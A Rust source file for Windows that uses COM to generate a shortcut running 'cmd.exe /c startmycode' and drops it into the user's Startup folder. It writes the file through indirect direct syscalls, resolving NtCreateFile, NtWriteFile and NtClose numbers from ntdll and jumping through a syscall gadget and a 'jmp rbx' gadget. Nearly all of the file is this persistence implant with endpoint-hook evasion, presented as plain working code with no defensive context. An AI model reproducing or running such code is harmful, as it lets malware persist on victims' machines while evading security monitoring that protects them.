#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

#[cfg(not(target_arch = "x86_64"))]
compile_error!("This project only supports x86_64 architecture.");

mod syscalls;

use std::ptr::null_mut;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
use windows_sys::Win32::System::Com::{
    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
    IStream,
};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock, GlobalSize};
use windows_sys::core::GUID;

// Define missing constants and functions
const CLSID_ShellLink: GUID = GUID {
    data1: 0x72024E10,
    data2: 0xE33D,
    data3: 0x11CF,
    data4: [0x8F, 0x1C, 0x00, 0x80, 0xC7, 0x44, 0x13, 0x78],
};

extern "system" {
    fn CreateStreamOnHGlobal(hglobal: *mut c_void, fdeleteonrelease: i32, ppstm: *mut *mut IStream) -> i32;
    fn GetHGlobalFromStream(pstm: *mut IStream, phglobal: *mut *mut c_void) -> i32;
}

// Define VTables manually for windows-sys
#[repr(C)]
struct IUnknownVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
}

#[repr(C)]
struct IShellLinkWVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    GetPath: usize,
    GetIDList: usize,
    SetIDList: usize,
    GetDescription: usize,
    SetDescription: usize,
    GetWorkingDirectory: usize,
    SetWorkingDirectory: usize,
    GetArguments: usize,
    SetArguments: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
    GetHotkey: usize,
    SetHotkey: usize,
    GetShowCmd: usize,
    SetShowCmd: usize,
    GetIconLocation: usize,
    SetIconLocation: usize,
    GetRelativePath: usize,
    SetRelativePath: usize,
    SetPath: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
}

#[repr(C)]
struct IPersistStreamVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    GetClassID: usize,
    IsDirty: usize,
    Load: usize,
    Save: unsafe extern "system" fn(*mut c_void, *mut IStream, i32) -> i32,
    GetSizeMax: usize,
}

const IID_IPersistStream: GUID = GUID {
    data1: 0x00000109,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

const IID_IShellLinkW: GUID = GUID {
    data1: 0x000214F9,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: HANDLE,
    pub ObjectName: *const UNICODE_STRING,
    pub Attributes: u32,
    pub SecurityDescriptor: *mut c_void,
    pub SecurityQualityOfService: *mut c_void,
}

#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub Status: NTSTATUS,
    pub Information: usize,
}

const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
const FILE_OVERWRITE_IF: u32 = 0x00000005;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const SYNCHRONIZE: u32 = 0x00100000;

fn to_nt_path(path: &str) -> Vec<u16> {
    let mut nt_path = "\\??\\".encode_utf16().collect::<Vec<u16>>();
    nt_path.extend(path.encode_utf16());
    nt_path.push(0);
    nt_path
}

fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
    let len = (buffer.len() - 1) * 2;
    UNICODE_STRING {
        Length: len as u16,
        MaximumLength: (len + 2) as u16,
        Buffer: buffer.as_ptr() as *mut u16,
    }
}

fn main() {
    unsafe {
        let ntdll_base = syscalls::get_ntdll_base();
        if ntdll_base.is_null() { return; }

        let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
        let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
        let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");

        let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
        let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");

        // 1. Generate LNK content using COM
        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);

        let mut shell_link_ptr: *mut c_void = null_mut();
        let res = CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr);
        if res != S_OK { return; }

        let shell_link_vtbl = *(shell_link_ptr as *mut *mut IShellLinkWVtbl);

        let target_path = "C:\\Windows\\System32\\cmd.exe".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
        ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());

        let args = "/c startmycode".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
        ((*shell_link_vtbl).SetArguments)(shell_link_ptr, args.as_ptr());

        let mut persist_stream_ptr: *mut c_void = null_mut();
        let res = ((*shell_link_vtbl).QueryInterface)(shell_link_ptr, &IID_IPersistStream, &mut persist_stream_ptr);

        let mut stream: *mut IStream = null_mut();
        if res == S_OK {
            let persist_stream_vtbl = *(persist_stream_ptr as *mut *mut IPersistStreamVtbl);
            CreateStreamOnHGlobal(null_mut(), 1, &mut stream);

            let res = ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1);
            if res == S_OK {
                let mut hglobal: *mut c_void = null_mut();
                GetHGlobalFromStream(stream, &mut hglobal);

                let size = GlobalSize(hglobal);
                let data_ptr = GlobalLock(hglobal);

                if !data_ptr.is_null() {
                    // 2. Resolve Startup folder path
                    if let Ok(appdata) = std::env::var("APPDATA") {
                        let startup_file = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startmycode.lnk", appdata);
                        let nt_startup_path = to_nt_path(&startup_file);
                        let unicode_startup = create_unicode_string(&nt_startup_path);

                        let mut out_handle: HANDLE = 0;
                        let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                        let mut obj_attr = OBJECT_ATTRIBUTES {
                            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
                            RootDirectory: 0,
                            ObjectName: &unicode_startup,
                            Attributes: OBJ_CASE_INSENSITIVE,
                            SecurityDescriptor: null_mut(),
                            SecurityQualityOfService: null_mut(),
                        };

                        // 3. Create the .lnk file using direct syscall
                        let status = crate::syscall!(
                            nt_create_file_ssn,
                            syscall_gadget,
                            jmp_rbx_gadget,
                            &mut out_handle as *mut _ as usize,
                            (GENERIC_WRITE | SYNCHRONIZE) as usize,
                            &mut obj_attr as *mut _ as usize,
                            &mut io_status as *mut _ as usize,
                            0,
                            FILE_ATTRIBUTE_NORMAL as usize,
                            0,
                            FILE_OVERWRITE_IF as usize,
                            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                            0,
                            0
                        );

                        if status == 0 {
                            let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                            // 4. Write the content using direct syscall
                            crate::syscall!(
                                nt_write_file_ssn,
                                syscall_gadget,
                                jmp_rbx_gadget,
                                out_handle as usize,
                                0,
                                0,
                                0,
                                &mut write_io_status as *mut _ as usize,
                                data_ptr as usize,
                                size as usize,
                                0,
                                0
                            );
                            crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
                        }
                    }
                    GlobalUnlock(hglobal);
                }
            }
        }

        // Cleanup
        if !persist_stream_ptr.is_null() {
            let persist_stream_vtbl = *(persist_stream_ptr as *mut *mut IUnknownVtbl);
            ((*persist_stream_vtbl).Release)(persist_stream_ptr);
        }
        if !shell_link_ptr.is_null() {
            let shell_link_vtbl = *(shell_link_ptr as *mut *mut IUnknownVtbl);
            ((*shell_link_vtbl).Release)(shell_link_ptr);
        }
        if !stream.is_null() {
            let stream_vtbl = *(stream as *mut *mut IUnknownVtbl);
            ((*stream_vtbl).Release)(stream as *mut _);
        }
    }
}
